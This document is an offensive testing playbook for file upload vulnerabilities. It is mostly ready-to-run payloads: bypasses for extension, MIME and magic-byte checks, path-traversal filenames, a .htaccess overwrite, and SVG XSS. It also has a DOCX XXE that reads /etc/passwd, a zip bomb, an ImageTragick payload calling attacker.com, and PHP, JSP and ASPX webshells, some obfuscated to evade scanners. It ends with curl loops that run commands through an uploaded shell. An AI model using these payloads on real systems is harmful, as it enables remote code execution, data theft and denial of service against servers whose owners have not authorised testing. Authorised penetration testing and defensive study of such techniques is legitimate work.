# VULN MODULE — File Upload Bypass
# Asset: webapp
# CWE-434 | Report prefix: WEB-UPLOAD

## THREAT MODEL

File upload vulnerabilities allow attackers to upload files that are:
- Executed server-side (PHP/JSP/ASPX webshell → RCE)
- Stored and served to other users (stored XSS via HTML/SVG)
- Used to exploit server-side parsers (XXE via XML, DoS via decompression bomb)
- Placed in attacker-controlled paths (path traversal in filename)

## PRE-EXPLOITATION CHECKLIST

Before testing bypasses, verify two prerequisites for RCE/XSS impact:

1. **File is retrievable** — you must be able to access the uploaded file via URL.
   If the app stores files in a private bucket/path with no public URL, execution is blocked.
   (Path traversal to web root can still work — see below.)

2. **Content-Type is not force-overridden** — if the server serves all uploaded files as
   `application/octet-stream`, the browser/server won't execute PHP or render XSS.
   Test: upload a `.php` file and check the response `Content-Type` when fetching it.

**Blacklist vs. whitelist detection:**
Upload a file with a completely random extension (e.g. `test.xyzabc123`).
- Accepted → the app uses a **blacklist** (easier to bypass with alt extensions)
- Rejected → likely a **strict whitelist** (harder; focus on parser confusion / regex evasion)

## WHITEBOX PATTERNS

```bash
# Upload handlers
grep -rn "move_uploaded_file\|$_FILES\|multipart" --include="*.php"
grep -rn "request\.files\|FileField\|upload_to" --include="*.py"
grep -rn "MultipartFile\|@RequestParam.*MultipartFile" --include="*.java"
grep -rn "multer\|formidable\|busboy\|multiparty" --include="*.js"

# Extension validation (check for bypass opportunities)
grep -rn "pathinfo\|extension\|mime_content_type\|finfo_file\|getimagesize" --include="*.php"
grep -rn "endswith\|splitext\|imghdr\|magic" --include="*.py"
grep -rn "getOriginalFilename\|getContentType" --include="*.java"

# Storage path construction (path traversal risk)
grep -rn "upload_dir\|UPLOAD_PATH\|\$_FILES.*name" --include="*.php"

# Content-type checks (easily bypassed)
grep -rn "Content-Type.*image\|mime_type.*image" --include="*.php" --include="*.py"
```

## EXTENSION BYPASS TECHNIQUES

### PHP execution extensions (try all when php/php3/phtml blocked)
```
.php .php3 .php4 .php5 .php7 .phtml .pht .phar .phps
.shtml .shtm .cgi .pl .py .asp .aspx .jsp .jspx
.php%00.jpg  (null byte — PHP < 5.3.4)
.php .jpg    (double extension)
.PHP         (uppercase)
.php.        (trailing dot — Windows)
.php         (trailing space — Windows)
```

### MIME type spoofing
```bash
# Server checks Content-Type header → send image MIME with PHP content
curl -s -X POST https://target.com/upload \
  -F "file=@shell.php;type=image/jpeg"

# Or manually in Burp — change Content-Type in multipart body:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

Additional Content-Type bypass vectors (try each):
- Send **multiple** Content-Type values: `Content-Type: application/x-php, image/png`
- **Remove** the Content-Type header entirely from the multipart part
- Whitelisted filename + malicious Content-Type: `filename="shell.png"` + `Content-Type: application/x-php`
- Malicious filename + whitelisted Content-Type: `filename="shell.php"` + `Content-Type: image/png`

### Magic bytes bypass (server reads first bytes to detect file type)
```bash
# Prepend a valid image magic bytes to PHP shell:
printf '\xff\xd8\xff' > bypass.php    # JPEG magic
echo '<?php system($_GET["cmd"]); ?>' >> bypass.php
# File starts with JPEG bytes but contains PHP — passes magic check, executes as PHP

# GIF with PHP
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
# Rename to shell.gif.php or exploit misconfigured Apache to execute

# PNG with PHP payload in EXIF
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png
mv image.png shell.png.php
```

### Filename path traversal
```bash
# Upload to unexpected directory
filename: "../../../var/www/html/shell.php"
filename: "....//....//....//var/www/html/shell.php"
filename: "%2e%2e%2f%2e%2e%2fvar%2fwww%2fhtml%2fshell.php"
filename: "..%5c..%5cvar%5cwww%5chtml%5cshell.php"  # Windows
```

### .htaccess upload (Apache)
```bash
# Upload a .htaccess that makes server execute .jpg as PHP:
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .jpg
EOF
# Then upload shell.jpg — Apache executes it as PHP

# If filename is not sanitized, use path traversal to place .htaccess
# in the upload directory or a parent directory:
# filename: "../.htaccess"
# filename: "../../.htaccess"
# filename: "%2e%2e%2f.htaccess"
# This overwrites the existing .htaccess and changes execution rules for that directory
```

### SVG XSS
```xml
<!-- Upload as profile picture / avatar — triggers XSS when viewed -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle r="100"/>
</svg>

<!-- Or with script tag -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

### XML/DOCX XXE via upload
```bash
# DOCX is a ZIP containing XML files — inject XXE in word/document.xml
mkdir -p docx-xxe/word
cat > docx-xxe/word/document.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<document>&xxe;</document>
EOF
cd docx-xxe && zip -r ../malicious.docx .

# Upload to any endpoint that parses DOCX/XLSX/PPTX
```

### Decompression bomb (DoS via zip bomb)
```bash
# Only report if DoS is in scope
python3 -c "
import zipfile, io
# Create a zip that expands to 1GB
with zipfile.ZipFile('bomb.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('bomb.txt', 'A' * (1024**3))
"
```

### ImageTragick (CVE-2016-3714) — legacy ImageMagick
```bash
# If app uses ImageMagick to process uploads:
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/x.png"|id; echo ")'
pop graphic-context
EOF
# Upload as .mvg or disguised as image
```

## WEBSHELL PAYLOADS

```php
<!-- Minimal PHP webshell -->
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['c']); ?>
<?php @eval($_POST['x']); ?>

<!-- Obfuscated (bypass content scanners) -->
<?php $f=base64_decode('c3lzdGVt');$f($_GET['c']); ?>
<?php $_="\x73\x79\x73\x74\x65\x6d";$_($_GET['c']); ?>
```

```jsp
<!-- JSP webshell -->
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
<%=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")})%>
```

```aspx
<!-- ASPX webshell -->
<%@ Page Language="C#"%><%System.Diagnostics.Process.Start("cmd","/c "+Request["c"]);%>
```

## POST-UPLOAD VERIFICATION

```bash
# After uploading shell.php, try to access it:
curl "https://target.com/uploads/shell.php?cmd=id"
curl "https://target.com/static/shell.php?cmd=whoami"
# Also try common upload paths if direct path unknown:
for path in uploads files static media images assets user-uploads; do
  curl -s "https://target.com/$path/shell.php?cmd=id" | grep -v "Not Found"
done
```
